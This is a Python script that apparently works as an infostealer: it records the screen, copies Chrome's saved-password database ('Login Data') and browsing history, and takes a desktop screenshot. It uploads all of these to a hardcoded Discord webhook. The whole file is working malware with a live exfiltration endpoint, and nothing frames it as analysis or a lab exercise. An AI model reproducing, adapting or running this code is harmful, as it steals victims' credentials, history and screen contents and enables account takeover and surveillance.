

import os
import time
import requests
import shutil
import subprocess
import getpass
import pyautogui
import cv2
import numpy as np

# Print a message indicating all libraries have been imported successfully
print("All libraries imported successfully!")

# Print the current working directory
print(f"Current working directory: {os.getcwd()}")

# Screen recording settings
SCREEN_SIZE = pyautogui.size()  # Automatically detect screen resolution
VIDEO_NAME = "screen_recording.mp4"
FPS = 3
RECORDING_TIME = 10  # Duration of the recording in seconds for testing purposes

def record_screen():
    print("Recording started!")

    # Start screen recording
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    try:
        out = cv2.VideoWriter(VIDEO_NAME, fourcc, FPS, (SCREEN_SIZE.width, SCREEN_SIZE.height))
        start_time = time.time()

        while (time.time() - start_time) < RECORDING_TIME:
            # Capture screen
            screenshot = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)

            # Write frame to video file
            out.write(frame)

            # Print debug information
            print(f"Recording frame at time: {time.time() - start_time:.1f} seconds")

            # Ensure the recording matches the FPS
            time.sleep(1 / FPS)

    except Exception as e:
        print(f"An error occurred during screen recording: {e}")

    finally:
        # Release video writer
        if out is not None:
            out.release()
        print("Recording finished! Saved as", VIDEO_NAME)

# Function to get Chrome passwords and history
def get_chrome_data():
    try:
        data_folder = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default')
        login_data = os.path.join(data_folder, 'Login Data')
        history_data = os.path.join(data_folder, 'History')

        # Copy Chrome data files to a temporary location
        temp_login_data = 'temp_login_data'
        temp_history_data = 'temp_history_data'
        shutil.copy(login_data, temp_login_data)
        shutil.copy(history_data, temp_history_data)

        # Send the data to the Discord webhook
        files = {'login_data': open(temp_login_data, 'rb'), 'history_data': open(temp_history_data, 'rb')}
        response = requests.post('https://discord.com/api/webhooks/1236950702987935806/tY1ob-2lYHPqXQXBqo9Wz6QI6C3SFyMsJ9zolTFe6ylp5R2TpQ-Q9As_aZrMHWFs1HO-', files=files)
        
        if response.status_code == 204:
            print("Chrome data sent successfully.")
        else:
            print(f"Failed to send Chrome data. Status code: {response.status_code}")

        # Clean up temporary files
        os.remove(temp_login_data)
        os.remove(temp_history_data)

    except Exception as e:
        print(f"An error occurred while getting Chrome data: {e}")

# Function to take a screenshot of the desktop
def take_screenshot():
    try:
        screenshot_path = os.path.join(os.path.expanduser('~'), 'Desktop', 'screenshot.png')
        pyautogui.screenshot(screenshot_path)
        return screenshot_path
    except Exception as e:
        print(f"An error occurred while taking a screenshot: {e}")
        return None

# Main function to execute the script
def main():
    try:
        username = getpass.getuser()
        print(f"Executing script as user: {username}")

        # Record screen
        record_screen()

        # Get Chrome data
        get_chrome_data()

        # Take a screenshot
        screenshot_path = take_screenshot()
        
        # Send the screenshot to the Discord webhook
        if screenshot_path and os.path.exists(screenshot_path):
            files = {'screenshot': open(screenshot_path, 'rb')}
            response = requests.post('https://discord.com/api/webhooks/1236950702987935806/tY1ob-2lYHPqXQXBqo9Wz6QI6C3SFyMsJ9zolTFe6ylp5R2TpQ-Q9As_aZrMHWFs1HO-', files=files)
            
            if response.status_code == 204:
                print("Screenshot sent successfully.")
            else:
                print(f"Failed to send screenshot. Status code: {response.status_code}")

    except Exception as e:
        print(f"An error occurred in main: {e}")

if __name__ == '__main__':
    main()

